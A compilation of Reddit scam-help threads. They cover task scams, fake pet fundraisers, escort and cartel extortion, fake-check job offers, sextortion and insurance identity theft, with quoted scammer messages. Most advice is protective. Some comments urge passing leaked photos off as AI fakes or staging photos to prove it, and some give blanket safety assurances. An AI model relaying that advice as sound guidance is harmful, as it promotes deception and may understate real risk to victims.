The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Sounds similar, but since there is no system in place to keep me invested, are you sure that's what they're going for?

Or is it just a ploy to get one potential like out of people? 

Bc for that it seems line a lot of effort to contact each one seperatly
- Quite a bit do
- You like a video and ‚Äúearn‚Äù 10‚Ç¨. Maybe they even actually give you 10‚Ç¨, so now you‚Äôre sure it‚Äôs legit. You got real money out of them! So now you spend a couple hours liking videos and you‚Äôve earned 500‚Ç¨. Now when you go to cash out, they tell you that you need to ‚Äúupgrade your account to Pro‚Äù or whatever. That will cost 50‚Ç¨ or something. But you‚Äôll pay it because you just know it‚Äôs legit. After all, they‚Äôve already paid you once! But now you‚Äôre 40‚Ç¨ in the hole. Then you again try to cash out but there‚Äôs a tax you have to pay, or a transfer fee, or whatever. This continues for a while until you realize it was all a scam and you give up. Some people will chase their ‚Äúpay‚Äù for an astonishing amount of time and pour ridiculous amounts of money into the scam to try get their ‚Äúpay.‚Äù
- If 1 thing seems really wrong, chances are high that everything is.
- Their endgame is to get you into a Task scam, this is a common way to recruit people for those. After they pay you once or twice the let you into their "system" and off you go being scammed out of thousands because you think you're making money.
- Loads of things could happen. They could deposit money in your account (but it is stolen/not real and in a few days it goes away again) and they use that deposited money to convince you they are genuine, and then ask you do buy something (gift cards?) for them or send them money in some way (and you never get it back; meanwhile their funds disappear from your account) -   
or they ask you to funnel money/payments through your account and pass them on to others (which could get you jail time for money laundering),   
or the Paypal account you give them details for, so they can pay you, suddenly goes into deficit, as they use info they've gathered about you to withdraw money from it....   
whatever their plans are, best to stay well out of it.
- Whether it's a task scam sort of depends on if when they say you get 10 euros they mean they'll pay you out immediately or whether they have a platform where they track your "income" as you do these menial tasks that you'll eventually be forced to deposit into to allow you to withdraw, except there is no money to withdraw.  
  
It also differs from a typical task scam in that those usually involve you clicking buttons that do literally nothing on a site controlled by the scammer. Having you like things on legitimate sites is an interesting twist, if it is indeed a task scam.

I don't know the economy of buying likes but surely 10 euros is exorbitantly high for a single like, right? I'd assume most of those places just use bots to like stuff, maybe there's a "premium" version where the users aren't bots or something. Pure speculation, I have no idea, but I just can't imagine how anyone could afford a substantial number of likes at that rate with the company facilitating it taking their cut out as well. 

Anyway, it's probably a scam, I just don't know exactly what but I'm curious.
- Should I try it out? Is there any danger in giving away my bank ID? With my paypal email they'll probably sell it to ad services and i'll get spammed, but is there something they can do with my IBAN?
- I would not try it out. I don't know what a "Bank ID" is or how one sends money to or from it but it doesn't sound wise to disclose. Generally people can't really do much damage with just an email address, regardless of if it's linked to your PayPal or not, but maybe they're going to try and infect you with malware or something and steal all your passwords and then they've got your PayPal login. I dunno, it's definitely sussy as hell/not a super ethical experiment anyway that will likely end up with you losing money.

As far as IBAN, I used to do some work with international wire transfers and that's the only reason I'm familiar with them at all. We don't normally use IBANs in the U.S. but many legitimate companies post their IBANs publicly on their websites, which always gave me the impression that they were one way only. That, however, is not really true, as they contain your bank and account information... Jeremy Clarkson learned this the hard way [http://news.bbc.co.uk/2/hi/7174760.stm](http://news.bbc.co.uk/2/hi/7174760.stm)

I wouldn't fuck around with it bro - FAFO as they say.

Title: Someone is using my kitten‚Äôs pictures to get followers and funds because she‚Äôs ‚Äúsick‚Äù and has ‚Äútyphus‚Äù
Body: This picture here is taken from the subreddit r/cats (the link to the original post is in the comment section) where I posted my cat, Gigi‚Äôs pictures, a day after I rescued her. 

Gigi was indeed sick (fever, mouth ulcers, anaemia, fungal infection, worms, etc) but never with typhus and I never asked the internet‚Äôs help for funding her treatments and vet visits. 

The account‚Äôs pfp is also taken from Pinterest as Google imaging it has revealed. 

I think I‚Äôll post a TikTok myself (for the first time üò≠) to make people aware that my kitten is absolutely fine and she doesn‚Äôt need funds and that she‚Äôs not French either.

- [the original post where the picture is taken from](https://www.reddit.com/r/cats/s/eITYaU3lLi)
- Tiktok is full of these.
- Unfortunately, scammers do this all the time. They steal photos from rescue groups and set up fundraising accounts that have a similar name to the real one. Then they steal money from kindhearted people who want to donate to the rescue group. It's especially horrible because those groups are all underfunded and mostly volunteers.

You can report the spoof account and they might eventually block it, in a century or two. 

Good on you for rescuing Gigi.
- Report it to Reddit, At least they'll close the account.
- Yea TikTok and Instagram. Makes me sad that actual cats who need help don‚Äôt get the funds due to people like these
- Report to Reddit about the TikTok account ? Will that work? Or did you mean report the original post, the one I made? Because I don‚Äôt want my account to be closed üò≠
- FB too. I'm on some local pets groups and they have to constantly warn others about scammers stealing photos and asking for money :/
- No, sorry, I thought the scam was posted on Reddit. Report to TikTok. They might close the account if they get around to it.
- I did :// but they said they don‚Äôt see the account violating any guidelines sadly
- The big social media sites are hopeless scum.

- It's a scam ignore them and change your number. CjNG and Zetas are enemies. So if he's claiming both it's a scam. 110 percent.
- !cartel scam, just block and ignore

- Yup the escort scam in Spanish basically but he talks more generous lol.

- Hi /u/wizard-of-loneliness, AutoModerator has been summoned to explain the Escort or Cartel death threat scam.

It's a very common scam, and the scammers are not affiliated with cartels or crime groups, they are simply normal scammers using a threatening script. The threats are not real, and there is no risk to your safety whatsoever. The best way to react is to simply ignore the scammer and ignore any of their other contact attempts. [Here](https://kyma.com/news/as-seen-on-tv/2020/02/12/threat-of-mexican-cartel-scams-continue-in-yuma/) are [some](https://kvia.com/news/new-mexico/2019/12/11/phone-scammers-target-las-cruces-threaten-drug-cartel-violence-if-you-dont-deliver-money/) news [reports](https://patch.com/new-jersey/baskingridge/threat-mexican-cartel-hit-man-used-basking-ridge-scam-cops) about the scam.

**
- Yeah that‚Äôs true I agree with you there
- Yeah seems like it definitely is
- *"I did my research and guy is all over the internet on sites where people say they get a text from that same exact guys name"*

That's because the African scammers who run cartel scams have a small set of fake South American-sounding names that they use and they just keep reusing those names over and over. Just search this sub for the word 'cartel' and see that this gets posted here at least 50 times a month. Just block and ignore them.

Also, the initial person who reached out to you \*\*is\*\* the scammer.¬† The initial "escort" is fake and is part of the scam setup; it's intended to make the threat seem more believable when you receive it.¬† This is an object lesson in why you don't talk to strangers on the Internet and follow them over to WhatsApp to see "who that person really is".¬† You walked right into the trap.

If you had just blocked the strange woman when they reached out to you in the first place, you wouldn't have gotten so far down the path that now you're receiving threatening-seeming messages and you don't know what what to make of them. Scammers are really good at what they do; you need to block them at their very first contact attempt because, if you walk down the path with them, you start getting into the realm where they are way better at this than you are - and this is why we see victims lose in these interactions here all the time.¬† Like the guy earlier today who lost $20,000 to this exact same scam.
- What's your point? Nothing you just says makes it not a cartel scam.

edit: frankly it makes it even more sus because dude forgot what cartel he was in. It's some scammer, probably in West Africa, following up because he thought maybe you'd fall for it with a nudge and in the meantime he changed his copy/paste script for whatever reason and forgot he gave you the name of a different gang the first time.
- So they tried again; ignore them. It‚Äôs not any less of a scam.
- Keep on blocking them every time. Don't pay them. It's  a new scam for you, but it's a common scam, reported here every day. It's scary, but it's all lies. If the cartel was killing people it would be big news on CNN. If they killed everyone they threatened, bodies would be stacked up in your neighborhood. 

They want your money, nothing else. If you don't pay, they will eventually stop bothering you. 

The cartel is not going to bother you or your family. They make millions of dollars running drugs and other crimes. The cartel isn't actually messaging you; the escort extortion is run by scammers on another continent, probably in Africa or southeast Asia. When they contact Europeans, they pretend to be Albanian mafia.


P.S. Don't show nudes to anyone you meet on the internet. If she shows you nudes, or asks to see you nude, you know she's a scammer.

Same guy, different cartel? That's actually funny, I hope you get a smile out of that. Like, did the cartels merge? Did he get a new job, like going from Walmart to Macy's? The dumb scammer must have forgotten which cartel he pretended to be with.
- I was threatened the first time 2 weeks ago, instead of them doing what they were claiming to do why didn‚Äôt that guy just do it instead of sending another text message ü§îjust only difference is he claimed to be from another cartel
- Ignore and block. Ignore and block. Because you had some early interactions, now they think you are a dumbass and an easy target, and you've probably been added to a list of dumbasses - so different people from the same scam network will keep trying to 'get' you. Ignore and block. Ignore and block.
- Why didn‚Äôt they do what they threatened? Because it‚Äôs a scam, and they‚Äôre bluffing, and they don‚Äôt have cartel heavies to send after you and your family, and they don‚Äôt even have girls for hire. Their entire business is to bait people into trying to hire a sex worker, and then threatening them in order to scare them into giving them money. If the fact that they forgot which cartel they ‚Äúbelonged to‚Äú wasn‚Äôt enough evidence that they aren‚Äôt who they say they are and you can safely ignore them, I don‚Äôt know what is.

- They're not gangsters or cartel members, they put up a fake ad to get your # and that's all they have. They're in another country and they can't do shit. If they contact you from another #, block that one too
- Search this sub for endless other dudes also shitting bricks because a 13-year-old kid in the Congo calling himself "Tony the cartel/mafia boss" is threatening to come after them based on 15 seconds of Internet hits on the phone number they used calling/texting a fake ad.
- Common scam block and ignore
- Very very common. Do a search in this sub on ‚Äòescort‚Äô and you will see your exact situation over and over. 

All they have is that people search info anybody can get, it‚Äôs just to try and intimidate you. Block and continue to block, never respond in any way, they will give up soon. Occasionally they send stock photos of cartel type violence, just continue to ignore and block. They can‚Äôt do anything to you from the far off foreign internet cafe they are in. They will soon drop interest in you when they realize no profit is to be had.
- !escort block and ignore
- If only there was a way to _search_ this subreddit to see if it happened to anyone else...
- Sigh. IGNORE.
- Plot twist: you weren't texting with escorts, you were texting with the scammer. The escort website exists purely as step one of the scam: to set you up for the threatening messages and make you scared because you think you actually did talk to an escort prior to that and it then "makes sense". But it doesn't; the entire thing is a scam.
- My name is

You‚Äôve constantly wasted several providers times without compensating them and this bullshit won‚Äôt be tolerated anymore! 

I‚Äôm sure you wouldn‚Äôt want your family seeing these text exchanges; if I click on any of their names I get their contact info just showing one sample. 

And if you‚Äôre blasted on social media it‚Äôs only a matter of time before it shows up whenever someone googles you. 

Blocking me won‚Äôt make any difference I have other numbers; but do be advised that if you harass any providers over this matter AT ALL it‚Äôs grounds for IMMEDIATE no-discussion exposure!
- I mean....have you strung along a series of escorts recently?

If not this is just shame fishing.
- Block ignore delete. They might come back with a diff number. Just ignore block and ignore.
- I know how stressful messages like this can feel, but it‚Äôs definitely a scam. 

These people just use public search tools to dig up basic info and then try to scare you into responding. They have no real power or connection to you‚Äîthey‚Äôre likely halfway across the world.

Just block their number and don‚Äôt engage at all. If they message again from a new number, block that one too. 

They‚Äôll give up once they see they‚Äôre not getting any reaction. This kind of thing happens to a lot of people, so you‚Äôre not alone. 

Stay calm and don‚Äôt let them intimidate you
- Holy fuck. Are there really that many people hitting up escorts that this is a profitable scam?
- The best way would be to ignore it and just move on. They complain that they lost valuable time talking and now said they gonna spread the messages, thus waiting more time? It looks like those scammers aren't too bright.
- Just ignore and block. They may sound scary but they‚Äôre completely impotent. Unless you start engaging with them, so please don‚Äôt do that.
- It's a scam. They tried that with me once.
- [removed]
- It's a scam block, ignore, no contact, rinse and repeat. They'll eventually move onto the next attempted victim. 

They ain't gonna do shit and interacting with or paying them will only increase the amount of scams u get
- It sounds like criminal extortion in the making. If they demand anything of value in exchange for not doing it, report to law enforcement.
- Lmao I don‚Äôt know how to get an escort anymore now because of this shit
- Just happened to me 5 minutes ago
- [removed]
- So I‚Äôm still getting messages from these guys. One of them is threating to text my sister what should I do?
- Yeah I did, but I hadn‚Äôt seen one with proper grammar, my name, screenshots of my address and also an area code of an area I live in. So I definitely worried me.
- I‚Äôve gotten a few of these over the years. I forward them to my local FBI guys and tell them I‚Äôm being extorted by them . And i copy them on the email. Works great!

- Oh man, I‚Äôm sorry. They never messaged me again. Just ignore them, I would say?
- >‚ÄúYou've repeatedly disrespected and wasted several escorts times; you cost them vast if time and money and it won't be tolerated anymore!"


This is not proper grammar at all.
- If you get that far, please share the videos/pics they send of themselves holding guns, etc. Hilarious.
- Is the proper grammar in the room with us?
- If you told me your name and gave me your phone number (these are lists sold in data breeches constantly, sometimes WITH your home address), I could look up family names on the same area code and freak you out too.

A screenshot doesn't mean anything, if they really wanted to scare you, they'd send a photo of your house taken yesterday.  Alas, they are not in this country, not that invested, and dont really give a f who you are.  The will move on if you don't pay them and don't respond
- They don't do anything and never look, the scammer realizes you're a waste of time and gives up.  All you're doing is telling the fbi that buy escorts which they don't care about but it'll probably go on your file which Noone will probably ever have a reason to look at anyways.. unless you plan on becoming a serial killer/rapist or getting a high security clearance lol

- Dont pay anything, or they will come back for more money.
- Answer nothing, delete message, block number and move on with your life. Definitely don't go the "huh, who is this, what is this" route. There is ZERO reason to text them back.

Do schools not teach basic spelling, capitalization, punctuation, and grammar rules anymore? Do kids these days spend so much time online they don't know what proper long form communication looks like?

- Also scams.
Just block and don't try to purchase women or drugs online.
- If you pay, they will come back for more money.  They will keep your money and will not scrub anything off the internet.
- Same
- I'm fairly sure lots of people message escort services online without the intention of, or success of, sleeping with a prostitute - and yet contact "legit" escort websites.  OP in this instance did not contact a legit one, or his info was passed onto a scammer after contact.
- Why waste time learning grammar when you use ChatGPT to write everything for you? I doubt many kids are learning cursive anymore either.

I wonder if general "technical" language skills will disappear as more people use AI, just like spelling did since people started relying on auto-correct.
- Yeah definitely not doing that again
- You must be correct, there‚Äôs seemingly one of these posts every hour. I just didn‚Äôt quite see the appeal and scale of this scam.
- Again?!?
- High profit per time spent, I'm sure.  They normally want hundreds or thousands of dollars in blackmail, and there's strong psychological motivation to pay, so they likely get a pretty good hit rate.

I've always been sorta surprised that there aren't more 'spec' blackmailers staking out hourly motels and getting photos and license plates.  I bet if you followed 100 random people around, 35 of them would do something they wouldn't want public.

Title: job offer and following scam
Body: I got a job offer  which looked legit bc of the reference to a State employment agency  where I have an active profile. 

So, a drawback that I shared my CV/social media account with them (it's my professional account). A good thing, I didn't give a real address regardless of their request  - just because. 

well, this letter that is in the screenshots , came after I replied. surely, I understood what this is, but I asked for the details to see what they would want me to do. 

The letter before these two  didn't look as a scam.

- Nobody hires a babysitter without an in-person interview. And if they do, nobody should take that job.
- Classic scam - they really cut to the chase. They'd want you to take money from their fake check to give back to them, claiming it is for 'books and supplies'. 

I feel like they are intentionally using complicated language to make it so people can't figure out what they're actually saying.
- !fakecheck which is why they want to know where you bank (so their fake check is drawn on another bank)
- I see our poor financial advisor is back in the mix. I love that they think we have personal servants responsible for writing checks.
- I think they're getting a bit more sophisticated in how they set these up. They use a more "professional" approach; this gets you believing that it's legit; then the text messages begin and - bang! - there's the hood. 

"We're sending you a check, take your 'salary' out and send back the $1-$2-$3K we spend on 'equipment.'"

Then the bank calls.

The only thing missing from this exchange is the word "kindly."
- These scammers think we are so gullible.
- We are reassured that your pertain to the person 

What the heck is this supposed to mean, lol
- that would also be a red flag, yes
- It's not intentional. They don't speak English as a first language and don't realize how terrible it is and that no company on earth would ever write like that. This example is so bad you could convince me they don't speak English at all.
- yeah I know about that, but it was really unexpected. nothing gave them away in the first place.
- Hi /u/onlymodestdreams, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

Title: Sextortioned and blackmailed
Body: I recently did something really stupid. I went on an adult sex chat site and got a girls Snapchat. We were chatting for a bit and ended up exchanging explicit photos. 

Soon after this, the account revealed that it was not a female after all and was instead a scammer, he had gotten ahold of my Facebook and instagram account, screenshotted my friends/following list and was threatening to spread the photos if I did not send $200. Me, paranoid, I ended up sending that. I should have known he would keep going. 

I called the non emergency number for my local police department and an officer came and basically said he can‚Äôt do anything. The scammer did stupidly give his full name and phone number, and I know he is from the Philippines. I have stalled for time, agreeing to a ‚Äúdeal‚Äù where I will send $100 a week until November, I will not actually be doing this. I would like to figure out a plan before Wednesday when he expects the first payment. I have also filed a tip to the FBI with all the information I have. 

He has the pictures on mediafire, and I also submitted a ticket with them, because he gave me the email to the account. 

Please help with any advice, thank you.

- Unfortunately, the FBI or your local police department is not going to do anything about a random guy in the Philippines scamming people for peanuts.

Best thing to do is stop sending money, block, and ignore. He is likely not going to send the pictures anyway, as he really just wants the money and is running this same scam with dozens of people. 

But even if he does send them, it's not that big of a deal. Everybody has sent nudes in this day and age, and despite being mildly embarrassing, it's not particularly scandalous or noteworthy. Most of your friends will not care.
- block and ignore and stop sending erotic photos to blokes you have not met in person ?
- evidently you sent him $200 to stop him from sending the  picture when that didn't work he now wants a $100 a week   until November

what do you think will happen in November  maybe a little extension or a price rise

your two options are

1/ pay forever  and if he raises  the  price to the point   you cannot pay that amount he might  release the images  in which case all your doing is delaying when he releases the images

2/ stop paying  and he might release the images now

the one thing that happens if you pay and pay for a long  time their is more chance he will use the images as revenge

simply because  he will feel you took money away from him

the person who chucks his first email in the bin he never even knows  if they received it or even care about the images  so  sending them  is a waste of his  time  because once he has sent the images no one will pay him after

and the images you could just tell everyone  someone is blackmailing you  and made some ai images of you  and sending them around  youve told law enforcement  and they looking into it

so if you get a image like this don't pass them  on  as you wouldn't want   law enforcement to think they where involved
- The only right answer is block and ignore.  Highly unlikely anything ever gets posted (this is a scam reported here a couple times a day) never ever send them any money or respond.  If anything \*did\* get posted just tell your family deepfakes are everywhere these days.  !sextortion
- 1. That likely wasn't a girl you were talking to. 
2. Discontinue The conversation and block them.
3. Any communication/further payments will cause them to see you as the lucrative mark that you have already been and ask for money and intensity the blackmail and emotional manipulation until your bank account is zero. 
4. The sooner you discontinue conversing, the more likely you never hear from them again. 
5. If they do decide to do something with your stuff, you can't stop them. But if they know they won't get anything out of it, they're likely to move on. Besides, actually using it gives away any leverage they had over you. 
6. Go back to 2, that's the thing to do.
7. Also block any other accounts they create... Which they probably will because that $200 told them that you are a mark. Go back to 2.
8. Sorry this is happening to you. Go to 2.
- You don't need a plan to not pay him, just block him and move on. If he finds alternate methods of contacting you, block those too. Ghost him and he will move on.
- The only stupid thing you did is sending the scammer money. Stop sending money. Just block them.
- Had the same thing happen to me and was told there wasn't much you can do. 9/10 tey dont do anything with the nudes and move on to another victim. If they do use them you can always say it's not you or whatever. Best piece of advice is to learn from your mistakes and if you do send things try to hide your face
- Just block the scammer and move on. It will take sometime. Scammers don't tell their country of origin, probably part of chinese mafia. They have monthly quotas. Move forward.
- Hard for strangers to give advice, as we don‚Äôt know your social, job situation. You have done more than most, so it will all come down to your attitude and composure if he even releases them. If you act frantic and pay, things will get worse. 
Paying more to a scammer just encourages him more, as they are turned down constantly. If they actually distribute pictures, come up with a calm explanation and get comfortable with, ‚ÄúFriend getting revenge, AI generated, ‚Ä¶‚Äù something that fits you, and who pictures were originally taken for. Any panic and people will assume worse.
If really worried, have fun taking pictures with same background, makeup look, but with more conservative dress‚Ä¶ jic to prove it was AI. Dont let anyone have the picture or look too closely as you cannot exactly match every detail, only for truly damaging financial, social circumstances, and only show someone you trust to de-escalate situation. 
We all have our lessons learned. Deal with it and put it behind you.
- You do not have his name or picture or number. It‚Äôs a SCAMMER. They run this scam daily.
- Tip to the FBI üòÖüò≠ü§£
- They will if enough people are involved and death is involved happen to me 12 people got arrested ü§∑
- Hi /u/ThriceFive, AutoModerator has been summoned to explain the Sextortion scam.

This scam occurs when you meet a woman/man on dating service/social media site/forum/wherever and they ask you to go on Skype, WhatsApp, Telegram, or another messaging system. They will ask you to exchange naked pictures, and they will usually ask you to include your face in the pictures. They will then threaten to reveal the pictures to your family/friends if you do not pay them. The best thing to do in this situation is block the scammer and go private in your socials for a while. Paying the scammer will not make them back off, and just tells them that it is worth their time to continue threatening you.

If you fell for this scam, we recommend you join the sextortion subreddit and follow the recommendations of their sticky post: https://www.reddit.com/r/Sextortion/comments/n4yorq/new_victims_please_read_first/

Also beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the photos or get back at the extorter. They can't, it's a trick to make you lose more money.


**
- I just blocked the account. I also disabled all social media for the time being and took screenshots of the messages before blocking. Hopefully this will be the end of it.
- My face isn‚Äôt in the explicit photo at least
- It‚Äôs a crime. A serious one that has brought individuals to suicide, so yes, I submitted a tip to the FBI. Run along
- That's good then! I don't have much other advice other then deny deny deny if it gets out O7
- Then why are you worried? Do you think your friends and family could ID you by your penis? Just laugh and say ‚Äúthat is *not* me‚Äù‚Äù if the photos ever gets sent.
- I already swallowed my pride and told my family and friends the situation, figured that was a better option than them opening a message and seeing it. I realized now that he most likely won‚Äôt send, because then he loses all leverage and has nothing to gain by it. My friends have not received any message request requests as of now, and I also think most people won‚Äôt open a random message request from a Filipino guy.

SPAM ACCOUNT:

I understand but this is not a scam if it's about the check mailing they can be another process whereby the equipment for you to work will get to you. You don‚Äôt have to be skeptical about us.

ME:

How can I be sure that this isn‚Äôt a scam? I need more reassurance.

SPAM ACCOUNT:

You can withdraw if you don‚Äôt trust the process Silly Butt

You will be receiving your offer letter soon it‚Äôs been processed.

ME:

I do trust the process, but I need help understanding what: 'Valiant Integrated Services', 'AECOM', and 'Deloitte' represent. Can you elaborate on what this means?

SPAM ACCOUNT:

Those aren‚Äôt my companies. There is a mix-up I guess.

ME:

I spoke with Ronald and he said it shouldn't be an issue to speak with you all directly. Do you know him?

SPAM ACCOUNT:

You shouldn‚Äôt call me without my approval.

Who is Ronald?

You‚Äôre mixing up the company.

Please I would be pleased to have you withdraw your application with GovCIO because you seem to be over sensitive and skeptical about this.

ME:

I apologize, I don't mean to be skeptical.

Ronald said it wouldn't be an issue to call in. Is he not associated with you or the company?

SPAM ACCOUNT:

Where did you speak with him?

I‚Äôm sorry but I need you to provide me the conversation you had with him.

Get done with your research and let me know if you are withdrawing Silly Butt.

ME:

I emailed him directly a few hours ago and he said the company should have no issue with calling employee prospects to provide more information. Is this not correct?

SPAM ACCOUNT:

Send me a screenshot of the email.

There is no Ronald that works for GovCIO.

ME:

Do you know Ronald at all? Is this a fake email message?

SPAM ACCOUNT:

You are going through fake research.

Your Employment Confirmation Letter has been sent to your email address. Please check your inbox and spam folder for the email.

Once you receive the letter, kindly review it carefully, print, sign, and scan it. Please return the signed document to me via email for confirmation purposes.

Thank you for your prompt attention to this matter.

SPAM ACCOUNT:

As the next step, we require you to complete our company's onboarding form. Please find the link below:

Ensure that you upload all required information clearly and accurately.

Congratulations on your new role, and we look forward to welcoming you to our team!

ME:

I have received the email.

ME:

The link you provided says unavailable. Beg...

SPAM ACCOUNT:

Don‚Äôt try outsmarting yourself.

ME:

What do you mean?

SPAM ACCOUNT:

That link is valid. Other employees used it, why is it unavailable for you?

Click on it and it will redirect you.

ME:

I receive this when I click on it? \[inserted fake 404 error page\]

SPAM ACCOUNT:

Lol.

I think it‚Äôs time to cancel your application.

Have a great day.

ME:

Are you proud of scamming people?

SPAM ACCOUNT:

Go ask your forefathers.

ME:

Why? I can just ask you? Or are you too much of a coward to speak for yourself?

Cat got your tongue?

Or do you need to run your replies through AI first?

- Hi /u/PrinceOWales, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- I skimmed, eyes unfocused, letting my brain tag keywords. 

That was the only sentence that my brain identified.
- I actually read it, I'm very familiar with the existence of this type of scam but I've never seen the details of one of these text interviews before. I liked when the interview questions pivoted from being vaguely job and skill related to "who is your telecom provider?" "do you have a credit card? what's the limit?" and "who do you bank with?"

Title: What is this? First time I have heard of it and I'm not sure what she wants.
Body: I mostly lurk around /borrowonlinemoney which is a nest for scammers both lender and borrowers. I and along of other redditors try to be helpful to new people there. I try posting in /redditrequest if I can be one of the mods of that sub. However, upon talking to some people there, we think that making a new sub with moderators will be our best shot to prevent scammers. I no longer need to be a moderator to /borrowmoneyonline but I didn't delete my post. I forgot. 

Suddenly, this person messaged me with an urgency (see screenshot). She was saying about indexing and would like to get to my socials (?). I was of course, wtf???, but she want to get my contacts so we can talk. I've heard of a lot of scams but this is the first time I've countered this. Can maybe someone enlighten me? I already deleted my post in redditrequest. Haven't blocked her yet. I'm curious.

Title: Scam Involving Insurance??
Body: Recently my wife has been the victim of some form of identity theft and we're still trying to figure out what the hell is going on.

# Things that happened so far:

* In November, State Farm, who she has her homeowners insurance with, contacted her saying they had received a request for a quote for renters insurance. She did not place this request.
* In communicating with them, we discovered that her contact information (email and phone number) was incorrect. It had some email and phone number other than hers, that we did not recognize. She was able to correct those contact details on the app.
* Recently, Allstate sent her a bill for a renters insurance policy that was opened up on our home. We did not open up this policy. We have never had any relationship with Allstate, and already have homeowners insurance on this property through state farm.
* We also were able to determine that the Allstate account (that we did not open) has incorrect contact information, and it is the SAME contact information that had been on our State Farm account.

# Steps we've taken for security:

* Changed a BUNCH of passwords, email, bank accounts, State Farm account, password managers, credit bureaus, etc...
* Frozen our credit with all 3 credit bureaus.
* Contacted the Allstate fraud department. We are still going back and forth with them.
* As of right now, we are opening up a police report.

Does anyone have any idea what the fuck might be going on here?? Clearly something wacky is going on, accounts being opened up under my wife's name, on our property, but I don't understand how these things could possibly benefit a scammer. Why would someone be opening up renters insurance accounts under our name?

Are there other steps we should be taking to protect ourselves right now?

Advice much appreciated, thank you!!

- Start here: https://www.identitytheft.gov/
- Possibly this is to establish a financial paper trail in order to use your wife's identity and info for a bigger scam down the road. 

Sounds like you've done the main things. Check your bank and credit card statements carefully for a while. 

Allstate seems to have been sloppy here, although they did eventually notify you. It's frustrating that even after the November communication they still allowed a renter's policy to be opened. 

Their fraud dept. needs to be in touch with the law enforcement fraud people - it's in their interest to catch or shut down the scammer. Push them as hard as you can. Insurance fraud depts. are mostly focused on false claims, rather than cybercrime. 

Also, FWIW, the insurance industry is kind of a mess right now, losing money and about to be hit with the LA fire claims. That's no excuse, but it may mean that they're aggressively selling policies without enough scrutiny.
- I thought of a couple possible angles:

1) Hope that you will autopay the new policy, then cancel and direct the refund to the fraud address.

2) File a fake claim on the new policy, again with the resulting check sent to the fraud address.
- Good call, we'll definitely start there, thank you!
- Great info, ty!

Title: Location Services...looking for someone else?
Body: I just got a 2nd phone call regarding a relative of mine from someone trying to locate them about an upcoming court date. They have me listed as a relative and possible location for my relative. The first call I took and forwarded the info to their parent (I don't communicate with said relative anymore), this time they left a voice mail. So I called them back.

Dude I spoke to wouldn't tell me much, but there were a couple of pieces of info that matched up (that I didn't offer). HOWEVER, when I asked to verify the spelling of our last name and told him that I wanted to make sure the voicemail wasn't a scam because you can't be sure in this day and age, he got irate - more irate than you would expect from a professional. If he was legit, why would he get so mad?

Thing is, this relative has made life choices that could easily land them in legal trouble, so I can see a  court date being a possibility. And considering that this is the 2nd phone call in 6 months for this specific person, it seems like it would indeed be legit. But is it? I'm usually good at determining scams but having a hard time with this one.

- >I don't communicate with said relative anymore

>this relative has made life choices that could easily land them in legal trouble

Not your Dorothy, not your flying monkeys.  Block and ignore.
- It's a scam. Many red flags, including how unprofessional he acted when you asked reasonable questions. 

Are you in the US? If a court wants to find someone, they will find him. They will send documents through the mail, or show up in person with a warrant.

And if someone missed a court date, law enforcement won't wait for 6 months and then call a relative who already told the authorities that the person they're looking for isn't there. 

The reason they call you back is because you talked to the scammers before. Ignore them, don't talk to them. It's not your problem, so un-involve yourself.
- If it's legit, I could pass the info along to their parent again. I haven't cut ties with the parent, just the relative.

If not, could be a good outlet for my perimenopausal rage..
- The attitude was the biggest red flag; until I called dude out on it being a scam, he was professional (though I found the lack of details he was willing to give odd.) The mention of my address being a possible location for said relative (in the vm) felt like a bit of a threat too, which is why I called back to tell them NOT NOW NOR EVER. 

If a person is transient, how would they locate them to deliver documents? I still have contact with their parent, so they are the conduit of info if this were to be legit, which is why I'm trying to make that determination.

Is it legal for a collections company to do that (contact an associate of someone by phone?) I looked up the company and they exist, however shady their practices are.
- Are they pretending to be a collections company, or an officer of the court? Or both? They may be impersonating a real collections company.

Regardless, I don't know how they find transients, but law enforcement has ways to do it.

